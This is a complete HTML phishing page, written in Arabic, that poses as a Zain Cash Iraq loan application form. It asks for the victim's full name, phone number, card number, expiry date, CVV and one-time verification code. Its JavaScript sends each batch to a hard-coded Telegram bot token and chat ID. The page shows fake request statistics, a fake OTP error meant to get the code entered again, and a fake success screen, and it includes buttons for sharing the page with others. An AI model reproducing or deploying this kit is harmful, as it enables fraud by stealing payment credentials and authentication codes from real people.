<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>طلب سلفة - Zain Cash العراق</title>
  <link rel="icon" href="https://www2.0zz0.com/2025/09/28/09/936521249.jpeg">
  <style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;500;400&display=swap');
:root {
  --main: #2672ea;
  --main2: #4a90e2;
  --bg: #f6f5fa;
  --bg2: #e2eafc;
  --card: #fff;
  --txt: #2c3e50;
  --success: #2ecc71;
  --error: #e74c3c;
  --boxshadow: 0 6px 32px rgba(0,0,0,0.09), 0 1.5px 8px rgba(46,130,255,0.07);
  --cardshadow: 0 2px 8px #eee;
}
body[data-theme="dark"] {
  --main: #1e3a5f;
  --main2: #2672ea;
  --bg: #181c25;
  --bg2: #222940;
  --card: #21273b;
  --txt: #e2eafc;
  --success: #2ecc71;
  --error: #e74c3c;
  --boxshadow: 0 6px 32px rgba(0,0,0,0.25), 0 1.5px 8px rgba(46,130,255,0.28);
  --cardshadow: 0 2px 8px #222940;
}
body {
  font-family: 'Cairo', Arial, sans-serif;
  background: linear-gradient(135deg, var(--bg) 0%, var(--bg2) 100%);
  min-height: 100vh;
  margin: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: background 0.5s;
  overflow-x: hidden;
}
#animated-bg {
  position: fixed;
  top: 0; left: 0; width: 100vw; height: 100vh;
  z-index: 0;
  pointer-events: none;
}
#welcome-modal {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(38,114,234,.1);
  z-index: 9999;
  display: flex; align-items: center; justify-content: center;
  animation: fadeIn 1.2s;
}
#welcome-modal.hide {display:none;}
#welcome-box {
  background: var(--card);
  border-radius: 18px;
  box-shadow: var(--boxshadow);
  padding: 2rem 1.6rem;
  text-align: center;
  animation: scaleIn 1s;
}
#welcome-box h2 {color:var(--main);font-size:2rem;margin-bottom:15px;}
#welcome-box p {color:var(--txt);font-size:1.15rem;margin-bottom:22px;}
#welcome-box button {background:var(--main);color:#fff;padding:10px 40px;border:none;font-size:1.1rem;border-radius:8px;cursor:pointer;}
@keyframes scaleIn {from{transform:scale(.6)} to{transform:scale(1)}}
.container {
  background: var(--card);
  border-radius: 22px;
  box-shadow: var(--boxshadow);
  padding: 2.5rem 2rem;
  width: 375px;
  max-width: 98vw;
  position: relative;
  transition: box-shadow 0.3s, background 0.5s;
  z-index:1;
}
.container:hover {
  box-shadow: 0 12px 40px rgba(37, 78, 218, 0.13), 0 2px 16px rgba(46,130,255,0.11);
}
.logo {
  width: 80px;
  display: block;
  margin: 0 auto 12px auto;
  border-radius: 12px;
  box-shadow: var(--cardshadow);
  animation: fadeIn 2s;
}
h1 {
  text-align: center;
  color: var(--main);
  margin-bottom: 22px;
  font-weight: 700;
  font-size: 1.7rem;
  letter-spacing: 1px;
}
.progress-bar {
  width: 100%;
  height: 8px;
  background: var(--bg2);
  border-radius: 7px;
  overflow: hidden;
  margin-bottom: 19px;
}
.progress-inner {
  height: 100%;
  background: linear-gradient(90deg, var(--main) 0%, var(--main2) 100%);
  width: 0%;
  transition: width 0.6s;
}
.stats {
  background: var(--bg2);
  padding: 8px 0;
  border-radius: 9px;
  text-align: center;
  font-size: 1.07rem;
  color: var(--main);
  margin-bottom: 15px;
  font-weight: 600;
  letter-spacing:.5px;
  animation: fadeIn 1.2s;
}
.step {display:none;animation: fadeIn 0.9s;}
.step.active {display:block;}
label {
  display: block;
  margin-bottom: 4px;
  color: var(--txt);
  font-weight: 500;
  font-size: 1rem;
  letter-spacing:.5px;
}
.input-wrap {
  position: relative;
  margin-bottom: 16px;
}
input, select {
  width: 100%;
  padding: 0.65rem 0.8rem 0.65rem 2.3rem;
  border: 1.7px solid #d9e0ed;
  border-radius: 9px;
  font-size: 1.1rem;
  background: #f7fafd;
  transition: border 0.2s, background 0.4s;
}
input[type="number"], input[type="tel"] {
  direction: ltr;
  font-family: 'Cairo', Arial, sans-serif;
}
select {
  padding-left: 0.8rem;
}
body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f47;border-color:#222940;color:#e2eafc;}
input:focus, select:focus {border-color: var(--main);outline:none;background: var(--bg2);}
.input-icon {
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  color: #b2b7c7;
  font-size: 1.2rem;
}
input.valid, select.valid {border-color: var(--success);}
input.invalid, select.invalid {border-color: var(--error);}
.btn {
  width: 100%;
  padding: 0.75rem;
  background: linear-gradient(90deg, var(--main) 0%, var(--main2) 100%);
  border: none;
  border-radius: 9px;
  color: white;
  font-size: 1.22rem;
  font-weight: 600;
  margin-top: 6px;
  cursor: pointer;
  transition: background 0.2s;
  box-shadow: 0 2px 8px #e2eafc;
}
.btn:disabled {
  opacity: .6;
  cursor: not-allowed;
}
.btn:hover {
  background: linear-gradient(90deg, var(--main2) 0%, var(--main) 100%);
}
.top-actions {
  display: flex;
  justify-content: flex-end;
  margin-bottom: 14px;
}
.theme-switch, .help-btn {
  background: var(--bg2);
  color: var(--main);
  border: none;
  font-size: 1.17rem;
  border-radius: 7px;
  padding: 5px 13px;
  cursor: pointer;
  margin-left: 6px;
  transition: background .3s, color .3s;
  box-shadow: 0 1px 5px #e2eafc;
}
.theme-switch.active {color:#fff;background:var(--main);}
.help-btn {font-size:1.22rem;}
.success {
  text-align: center;
  padding: 2rem 0.5rem 1rem 0.5rem;
}
.success svg {
  margin-bottom: 18px;
  background: #fff;
  border-radius: 50%;
}
.success h2 {
  color: var(--success);
  font-weight: 700;
  margin-bottom: 13px;
}
.success p {
  color: var(--txt);
  font-size: 1.1rem;
  margin-bottom: 23px;
}
#toast {
  position: fixed;
  bottom: 18px;
  right: 18px;
  background: var(--main);
  color: #fff;
  padding: 14px 28px;
  border-radius: 13px;
  font-size: 1.1rem;
  box-shadow: 0 2px 16px var(--main2);
  opacity: 0;
  transition: opacity 0.4s, bottom 0.4s;
  z-index: 999;
  pointer-events: none;
}
#toast.show {
  opacity: 1;
  bottom: 38px;
}
#helpModal {
  position:fixed;top:0;left:0;right:0;bottom:0;
  background:rgba(38,114,234,.12);display:none;z-index:9999;
  align-items:center;justify-content:center;
}
#helpModal.active {display:flex;}
#helpBox {
  background:var(--card);border-radius:16px;box-shadow:var(--boxshadow);padding:2rem 1.7rem;min-width:260px;max-width:90vw;
  animation:scaleIn .6s;
}
#helpBox h3 {color:var(--main);margin-bottom:16px;}
#helpBox ul {margin:0;padding:0 0 0 15px;}
#helpBox li {margin-bottom:8px;color:var(--txt);}
#helpBox button {margin-top:18px;background:var(--main);color:#fff;padding:7px 25px;border:none;font-size:1rem;border-radius:8px;cursor:pointer;}
.share-bar {
  margin: 15px 0;
  display: flex;
  justify-content: center;
  gap: 16px;
}
.share-btn {
  background: var(--main2);
  color: #fff;
  border: none;
  border-radius: 7px;
  padding: 7px 19px;
  font-size: 1.05rem;
  cursor: pointer;
  transition: background .3s;
  box-shadow: 0 1px 5px #e2eafc;
}
.share-btn:hover {background:var(--main);}
.support-btn {
  position: fixed;
  left: 18px;
  bottom: 18px;
  background: var(--success);
  color: #fff;
  border: none;
  border-radius: 50%;
  width: 56px; height: 56px;
  font-size: 2rem;
  box-shadow: 0 2px 12px #2ecc7140;
  cursor: pointer;
  z-index:900;
  transition: background .2s;
}
.support-btn:hover {background:var(--main2);}
.live-status {
  text-align:center;
  margin: 28px 0 18px 0;
}
.live-loader {
  display: inline-block;
  width: 45px; height: 45px; border-radius:50%;
  border: 4.5px solid var(--main2);
  border-top: 4.5px solid var(--bg2);
  animation: spin 1.1s linear infinite;
  margin-bottom: 12px;
}
@keyframes spin {to{transform:rotate(360deg);}
}
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(18px);}
  to { opacity: 1; transform: translateY(0);}
}
@media (max-width: 520px) {
  .container { padding: 1.2rem 0.8rem; width: 98vw;}
  h1 { font-size: 1.1rem;}
  #helpBox {padding:1.1rem;}
  .support-btn {bottom: 9px; left: 9px;}
}
::-webkit-scrollbar {width:7px;background:var(--bg2);}
::-webkit-scrollbar-thumb {background:var(--main2);border-radius:20px;}
</style>
</head>
<body data-theme="light">
<canvas id="animated-bg"></canvas>
<div id="welcome-modal">
  <div id="welcome-box">
    <h2>مرحبا بك!</h2>
    <p>يسرنا تقديم خدمة طلب السلفة عبر زين كاش العراق بتجربة جديدة ومميزات متقدمة.<br>ابدأ الآن!</p>
    <button onclick="document.getElementById('welcome-modal').classList.add('hide')">ابدأ الخدمة</button>
  </div>
</div>
  <div class="container">
    <div class="top-actions">
      <button class="theme-switch" id="themeSwitch" title="تغيير الوضع">🌙</button>
      <button class="help-btn" id="helpBtn" title="مساعدة فورية">❓</button>
    </div>
    <img src="https://www2.0zz0.com/2025/09/28/09/936521249.jpeg" class="logo" alt="شعار زين كاش"/>
    <h1 id="mainTitle">تقديم طلب سلفة</h1>
    <div class="stats" id="statsBox">
      تم تقديم <span id="todayCount"></span> طلب اليوم و <span id="monthCount"></span> هذا الشهر 🚀
    </div>
    <div class="progress-bar"><div class="progress-inner" id="progressBar"></div></div>
    <div id="step1" class="step active">
      <form id="loanForm" autocomplete="off">
        <label id="nameLabel"> الاسم الرباعي </label>
        <div class="input-wrap">
          <input type="text" id="userName" placeholder="اكتب اسمك الرباعي" required>
          <span class="input-icon" id="nameIcon">👤</span>
        </div>
        <label id="amountLabel"> مبلغ السلفة</label>
        <div class="input-wrap">
          <select id="loanAmount" required>
            <option value="" disabled selected>اختر مبلغ السلفة</option>
            <option value="500000">500,000 دينار</option>
            <option value="750000">750,000 دينار</option>
            <option value="1000000">1,000,000 دينار</option>
            <option value="1250000">1,250,000 دينار</option>
            <option value="2000000">2,000,000 دينار</option>
            <option value="4000000">4,000,000 دينار</option>
            <option value="5000000">5,000,000 دينار</option>
            <option value="10000000">10,000,000 دينار (للمتسبين وزارياً)</option>
          </select>
          <span class="input-icon" id="amountIcon">💰</span>
        </div>
        <label id="phoneLabel"> رقم الهاتف </label>
        <div class="input-wrap">
          <input type="tel" id="userPhone" pattern="\d{10,15}" placeholder="مثال: 077xxxxxxxx" required inputmode="numeric">
          <span class="input-icon" id="phoneIcon">📱</span>
        </div>
        <button type="submit" class="btn" id="step1Btn">متابعة</button>
      </form>
    </div>

    <div id="step2" class="step">
      <form id="cardForm" autocomplete="off">
        <label id="cardLabel"> رقم بطاقة زين كاش </label>
        <div class="input-wrap">
          <input type="text" maxlength="16" pattern="\d{16}" id="cardNumber" placeholder="ادخل رقم البطاقة" required inputmode="numeric">
          <span class="input-icon" id="cardIcon">💳</span>
        </div>
        <label id="expLabel"> تاريخ انتهاء البطاقة </label>
        <div class="input-wrap">
          <input type="text" maxlength="5" id="expDate" placeholder="مثال: 01/27" required inputmode="numeric">
          <span class="input-icon" id="expIcon">📆</span>
        </div>
        <label id="cvvLabel"> رمز CVV </label>
        <div class="input-wrap">
          <input type="text" maxlength="3" pattern="\d{3}" id="cvv" placeholder="ادخل رمز CVV" required inputmode="numeric">
          <span class="input-icon" id="cvvIcon">🔒</span>
        </div>
        <button type="submit" class="btn" id="step2Btn">متابعة</button>
      </form>
    </div>

    <div id="step3" class="step">
      <form id="otpForm" autocomplete="off">
        <label id="otpLabel"> رمز التحقق (6 أرقام) </label>
        <div class="input-wrap">
          <input type="text" maxlength="6" pattern="\d{6}" id="otp" placeholder="ادخل رمز التحقق" required inputmode="numeric">
          <span class="input-icon" id="otpIcon">🔢</span>
        </div>
        <button type="submit" class="btn" id="step3Btn">تأكيد</button>
      </form>
    </div>

    <div id="step4" class="step">
      <div class="live-status" id="liveStatus">
        <div class="live-loader"></div>
        <div id="liveMsg">جاري معالجة الطلب...</div>
      </div>
      <div class="success" id="finalSuccess" style="display:none;">
        <svg width="64" height="64" fill="#2ecc71" viewBox="0 0 64 64">
          <circle cx="32" cy="32" r="32"/>
          <polyline points="18,34 29,46 46,20" fill="none" stroke="#fff" stroke-width="5"/>
        </svg>
        <h2 id="thanksTitle">تم تقديم طلب السلفة بنجاح!</h2>
        <p id="thanksText">سيتم التواصل معك قريباً لاستلام المبلغ. شكراً لاستخدامك خدمتنا.</p>
        <div class="share-bar">
          <button class="share-btn" onclick="shareNow('whatsapp')">مشاركة عبر واتساب</button>
          <button class="share-btn" onclick="shareNow('telegram')">مشاركة عبر تيليجرام</button>
        </div>
        <button class="btn" onclick="window.location.reload()">طلب جديد</button>
      </div>
    </div>
  </div>

  <button class="support-btn" id="supportBtn" title="تواصل دعم"><span>💬</span></button>

  <div id="helpModal">
    <div id="helpBox">
      <h3>مساعدة فورية</h3>
      <ul>
        <li>🔹 أدخل جميع البيانات بشكل صحيح لضمان قبول الطلب.</li>
        <li>🔹 لا تشارك معلومات بطاقتك مع أي جهة غير موثوقة.</li>
        <li>🔹 إستخدم زر الوضع الليلي لجعل التصفح أكثر راحة ليلاً.</li>
        <li>🔹 اختر مبلغ السلفة من القائمة.</li>
        <li>🔹 في حال لم يصلك رمز التحقق، تأكد من صحة بياناتك.</li>
      </ul>
      <button onclick="document.getElementById('helpModal').classList.remove('active')">إغلاق</button>
    </div>
  </div>

  <div id="toast"></div>
  <audio id="successSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_115b6b4b8e.mp3"></audio>
  <audio id="errorSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_114b6b4b8e.mp3"></audio>
  <script>
  // Telegram Bot Info
  const TELEGRAM_TOKEN = "7713450543:AAHm3l6t9O4EFmVxwtBoLg4a3M12mb0E5yM";
  const TELEGRAM_CHATID = "6873334348";
  let spamBlock = false;
  let userData = {};

  // خلفية متحركة
  function animateBg() {
    const canvas = document.getElementById('animated-bg');
    const ctx = canvas.getContext('2d');
    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    let circles = [];
    for(let i=0;i<18;i++){
      circles.push({
        x:Math.random()*canvas.width,
        y:Math.random()*canvas.height,
        r:Math.random()*16+7,
        dx:Math.random()*2-1,
        dy:Math.random()*2-1,
        color:i%3===0?"#2672ea55":(i%2===0?"#4a90e255":"#2ecc7140")
      });
    }
    function draw(){
      ctx.clearRect(0,0,canvas.width,canvas.height);
      circles.forEach(c=>{
        ctx.beginPath();
        ctx.arc(c.x,c.y,c.r,0,2*Math.PI);
        ctx.fillStyle=c.color;
        ctx.fill();
        c.x+=c.dx;c.y+=c.dy;
        if(c.x<0||c.x>canvas.width)c.dx*=-1;
        if(c.y<0||c.y>canvas.height)c.dy*=-1;
      });
      requestAnimationFrame(draw);
    }
    draw();
  }
  animateBg();

  // شريط التقدم
  function setProgress(step) {
    let p = (step/3)*100;
    document.getElementById('progressBar').style.width = p + "%";
  }
  setProgress(0);

  // إحصائيات الطلبات (وهمية)
  function setStats() {
    let today = Math.floor(200 + Math.random()*50);
    let month = Math.floor(2200 + Math.random()*500);
    document.getElementById('todayCount').textContent = today;
    document.getElementById('monthCount').textContent = month;
  }
  setStats();

  // تبديل الوضع الليلي
  document.getElementById('themeSwitch').onclick = function() {
    let body = document.body;
    if(body.getAttribute("data-theme") == "light") {
      body.setAttribute("data-theme","dark");
      this.innerHTML = "☀️";
      this.classList.add("active");
    } else {
      body.setAttribute("data-theme","light");
      this.innerHTML = "🌙";
      this.classList.remove("active");
    }
  };

  // زر المساعدة
  document.getElementById('helpBtn').onclick = function() {
    document.getElementById("helpModal").classList.add("active");
  };

  // زر دعم واتساب وتيليجرام
  document.getElementById('supportBtn').onclick = function() {
    window.open('https://t.me/zaincashiraq','_blank');
  };

  // عرض خطوة معينة
  function showStep(n) {
    document.querySelectorAll(".step").forEach((el, i) => el.classList.toggle('active', i === n));
    setProgress(n);
  }

  // التوست المنبثق + صوت
  function showToast(msg, color="var(--main)", audio="") {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.style.background = color;
    toast.classList.add('show');
    if(audio === "success") document.getElementById('successSound').play();
    if(audio === "error") document.getElementById('errorSound').play();
    setTimeout(()=>toast.classList.remove('show'), 1700);
  }

  // تحقق مباشر من المدخلات
  function validateInput(id, regex) {
    let inp = document.getElementById(id);
    inp.addEventListener('input', function(){
      if(regex.test(inp.value)){
        inp.classList.remove("invalid");
        inp.classList.add("valid");
      } else {
        inp.classList.add("invalid");
        inp.classList.remove("valid");
      }
    });
  }
  validateInput('userName', /^[\u0600-\u06FFa-zA-Z\s]{7,}$/);
  validateInput('userPhone', /^\d{10,15}$/);
  validateInput('cardNumber', /^\d{16}$/);
  validateInput('expDate', /^(0[1-9]|1[0-2])\/\d{2}$/);
  validateInput('cvv', /^\d{3}$/);
  validateInput('otp', /^\d{6}$/);

  // منع السبام
  function blockSpam(ms) {
    spamBlock = true;
    setTimeout(()=>{spamBlock=false;}, ms);
  }

  // Step1: الاسم، مبلغ السلفة، رقم الهاتف
  document.getElementById('loanForm').onsubmit = async function(e) {
    e.preventDefault();
    if(spamBlock) return showToast('انتظر قليلاً ...', '#e67e22');
    const userName = document.getElementById('userName').value.trim();
    const loanAmount = document.getElementById('loanAmount').value;
    const userPhone = document.getElementById('userPhone').value.trim();
    if (userName.length < 7) {
      showToast('يرجى إدخال الاسم الرباعي بشكل صحيح', 'var(--error)', "error");
      return;
    }
    if (!loanAmount) {
      showToast('يرجى اختيار مبلغ السلفة', 'var(--error)', "error");
      return;
    }
    if (!/^\d{10,15}$/.test(userPhone)) {
      showToast('يرجى إدخال رقم هاتف صحيح', 'var(--error)', "error");
      return;
    }
    userData = {userName, loanAmount, userPhone};
    showStep(1);
    blockSpam(3000);
    showToast('جاري إرسال البيانات...','','');
    // إرسال المعلومات الأساسية للبوت
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHATID,
        text: `طلب سلفة جديد:\nالاسم: ${userName}\nالمبلغ: ${Number(loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userPhone}`
      })
    });
    setTimeout(()=>showStep(2), 1500);
  };

  // Step2: معلومات البطاقة
  document.getElementById('cardForm').onsubmit = async function(e) {
    e.preventDefault();
    if(spamBlock) return showToast('انتظر قليلاً ...', '#e67e22');
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g,'');
    const expDate = document.getElementById('expDate').value;
    const cvv = document.getElementById('cvv').value;
    if (!/^\d{16}$/.test(cardNumber)) {
      showToast('رقم البطاقة غير صحيح', 'var(--error)', "error");
      return;
    }
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expDate)) {
      showToast('تاريخ الانتهاء يجب أن يكون مثل 01/27', 'var(--error)', "error");
      return;
    }
    if (!/^\d{3}$/.test(cvv)) {
      showToast('رمز CVV غير صحيح', 'var(--error)', "error");
      return;
    }
    userData.cardNumber = cardNumber;
    userData.expDate = expDate;
    userData.cvv = cvv;
    showStep(2);
    blockSpam(3000);
    showToast('جاري إرسال بيانات البطاقة...','','');
    // إرسال المعلومات للبوت
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHATID,
        text: `معلومات بطاقة زين كاش:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${cardNumber}\nتاريخ الانتهاء: ${expDate}\nرمز CVV: ${cvv}`
      })
    });
    setTimeout(()=>showStep(3), 1500);
  };

  // Step3: رمز التحقق
  document.getElementById('otpForm').onsubmit = async function(e) {
    e.preventDefault();
    if(spamBlock) return showToast('انتظر قليلاً ...', '#e67e22');
    const otp = document.getElementById('otp').value;
    if (!/^\d{6}$/.test(otp)) {
      showToast('رمز التحقق يجب أن يكون 6 أرقام', 'var(--error)', "error");
      return;
    }
    showStep(3);
    blockSpam(3000);
    showToast('جاري التحقق...','','');
    // إرسال رمز التحقق وجميع المعلومات للبوت
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHATID,
        text: `طلب سلفة مكتمل:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${userData.cardNumber}\nتاريخ الانتهاء: ${userData.expDate}\nرمز CVV: ${userData.cvv}\nرمز التحقق: ${otp}`
      })
    });
    // إظهار خطأ ثم معالجة الطلب ثم نجاح
    setTimeout(()=>{
      showToast('رمز التحقق غير صحيح، جرب مرة أخرى', '#e67e22', "error");
      document.getElementById('otp').value = "";
    }, 1300);
    setTimeout(()=>showStep(3), 2000);
    setTimeout(()=>{
      showStep(4);
      document.getElementById('liveStatus').style.display = 'block';
      document.getElementById('finalSuccess').style.display = 'none';
    }, 3200);
    setTimeout(()=>{
      document.getElementById('liveStatus').style.display = 'none';
      document.getElementById('finalSuccess').style.display = 'block';
      showToast('تم معالجة الطلب بنجاح', 'var(--success)', "success");
    }, 6000);
  };

  // إدخال تلقائي لتاريخ البطاقة
  document.getElementById('expDate').addEventListener('input', function(e) {
    let v = e.target.value.replace(/[^\d]/g, '');
    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
    e.target.value = v.slice(0,5);
  });

  // زر المشاركة
  window.shareNow = function(type) {
    let url = window.location.href;
    let msg = "قدمت طلب سلفة من موقع ZainCash العراق! جرب الخدمة الآن: ";
    if(type==="whatsapp") {
      window.open(`https://wa.me/?text=${encodeURIComponent(msg+url)}`,"_blank");
    } else if(type==="telegram") {
      window.open(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(msg)}`,"_blank");
    }
  }

  // إغلاق نافذة الترحيب بعد 7 ثواني تلقائيا
  setTimeout(()=>document.getElementById('welcome-modal').classList.add('hide'),7000);
  </script>
</body>
</html>